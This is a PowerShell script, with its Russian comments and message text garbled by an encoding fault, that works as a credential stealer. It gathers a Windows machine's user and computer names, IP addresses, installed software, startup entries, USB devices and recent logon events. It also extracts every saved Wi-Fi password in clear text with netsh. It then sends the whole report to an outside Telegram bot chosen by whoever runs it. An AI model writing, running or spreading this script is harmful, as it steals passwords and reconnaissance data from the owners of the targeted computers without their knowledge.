param(
    [string]$botToken,
    [string]$chatId
)

# === –ü–æ–ª—É—á–µ–Ω–∏–µ —Ç–µ–º–ø–µ—Ä–∞—Ç—É—Ä—ã CPU ===
function Get-CPUTemp {
    try {
        $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
        if (-not $isAdmin) {
            return "‚ùå –ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ –ø—Ä–∞–≤"
        }

        $temp = Get-WmiObject MSAcpi_ThermalZoneTemperature -Namespace "root/wmi" | ForEach-Object {
            ($_.CurrentTemperature - 2732) / 10.0
        } | Select-Object -First 1

        if ($temp) {
            return "üî• {0:N1} ¬∞C" -f $temp
        } else {
            return "‚ùå –ù–µ—Ç –¥–∞–Ω–Ω—ã—Ö"
        }
    } catch {
        return "‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å"
    }
}

# === –°–±–æ—Ä –æ—Å–Ω–æ–≤–Ω–æ–π –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ ===
$compName = $env:COMPUTERNAME
$userName = $env:USERNAME
$uptime = (Get-CimInstance Win32_OperatingSystem).LastBootUpTime
$uptimeFormatted = ((Get-Date) - $uptime).ToString("dd\.hh\:mm\:ss")
$localIP = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notlike "169.*" } | Select-Object -First 1 -ExpandProperty IPAddress)
try {
    $externalIP = Invoke-RestMethod -Uri "https://api.ipify.org?format=text"
} catch {
    $externalIP = "‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å"
}
$cpuTemp = Get-CPUTemp

# === –£—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—ã–µ –ø—Ä–æ–≥—Ä–∞–º–º—ã ===
$appList = Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*, HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |
    Where-Object { $_.DisplayName } |
    Select-Object -First 10 DisplayName, DisplayVersion

$apps = ""
foreach ($app in $appList) {
    $apps += "üì¶ $($app.DisplayName) ($($app.DisplayVersion))`n"
}

# === –°–µ—Ç–µ–≤—ã–µ –ø–∞—Ä–∞–º–µ—Ç—Ä—ã ===
$networkLines = ipconfig /all | Select-String "IPv4|DNS|Default Gateway"
$network = ""
foreach ($line in $networkLines) {
    $network += "üåê $($line.Line)`n"
}

# === –ê–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫–∞ ===
$startupItems = Get-CimInstance -ClassName Win32_StartupCommand | Select-Object -First 10 Name, Command
$startup = ""
foreach ($item in $startupItems) {
    $startup += "üöÄ $($item.Name): $($item.Command)`n"
}

# === USB-—É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞ ===
$usbList = Get-WmiObject Win32_USBControllerDevice | ForEach-Object {
    [wmi]($_.Dependent)
} | Select-Object -First 5 Description

$usbDevices = ""
foreach ($usb in $usbList) {
    $usbDevices += "üîå $($usb.Description)`n"
}

# === –õ–æ–≥–∏ –≤—Ö–æ–¥–∞ ===
$loginList = Get-EventLog -LogName Security -InstanceId 4624 -Newest 5
$logins = ""
foreach ($entry in $loginList) {
    $logins += "üîê $($entry.TimeGenerated): $($entry.ReplacementStrings[5])`n"
}

# === –ü–æ–ª—É—á–µ–Ω–∏–µ –ø–∞—Ä–æ–ª–µ–π Wi-Fi ===
$wifiProfiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {
    ($_ -split ":")[1].Trim()
}

$wifiPasswords = ""
foreach ($profile in $wifiProfiles) {
    $wifiDetails = netsh wlan show profile name="$profile" key=clear
    $wifiPassword = ($wifiDetails | Select-String "Key Content" | ForEach-Object { ($_ -split ":")[1].Trim() })
    if ($wifiPassword) {
        $wifiPasswords += "üîë <b>$profile</b>: $wifiPassword`n"
    }
}

# === –°–æ–±–∏—Ä–∞–µ–º –ø–æ–ª–Ω—ã–π —Ç–µ–∫—Å—Ç —Å–æ–æ–±—â–µ–Ω–∏—è —Å —ç–º–æ–¥–∑–∏ ===
$message = @"
<b>üñ•Ô∏è –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –ü–ö:</b>

<b>üë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å:</b> $userName  
<b>üíª –ö–æ–º–ø—å—é—Ç–µ—Ä:</b> $compName  
<b>‚è±Ô∏è –ê–ø—Ç–∞–π–º:</b> $uptimeFormatted  
<b>üåê –õ–æ–∫–∞–ª—å–Ω—ã–π IP:</b> $localIP  
<b>üì° –í–Ω–µ—à–Ω–∏–π IP:</b> $externalIP  
<b>üî• –¢–µ–º–ø–µ—Ä–∞—Ç—É—Ä–∞ CPU:</b> $cpuTemp

---

<b>üì¶ –£—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—ã–µ –ø—Ä–æ–≥—Ä–∞–º–º—ã:</b>  
$apps

---

<b>üåê –°–µ—Ç–µ–≤—ã–µ –ø–∞—Ä–∞–º–µ—Ç—Ä—ã:</b>  
$network

---

<b>üöÄ –ê–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫–∞:</b>  
$startup

---

<b>üîå –ü–æ–¥–∫–ª—é—á—ë–Ω–Ω—ã–µ USB-—É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞:</b>  
$usbDevices

---

<b>üîê –ü–æ—Å–ª–µ–¥–Ω–∏–µ –≤—Ö–æ–¥—ã –≤ —Å–∏—Å—Ç–µ–º—É:</b>  
$logins

---

<b>üíæ –°–æ—Ö—Ä–∞–Ω—ë–Ω–Ω—ã–µ Wi-Fi —Å–µ—Ç–∏ –∏ –ø–∞—Ä–æ–ª–∏:</b>  
$wifiPasswords
"@

# === –û—Ç–ø—Ä–∞–≤–∫–∞ –≤ Telegram ===
Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" `
    -Method POST `
    -ContentType "application/x-www-form-urlencoded" `
    -Body @{
        chat_id = $chatId
        text = $message
        parse_mode = "HTML"
    }

Write-Host "–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è —É—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞ –≤ Telegram!"
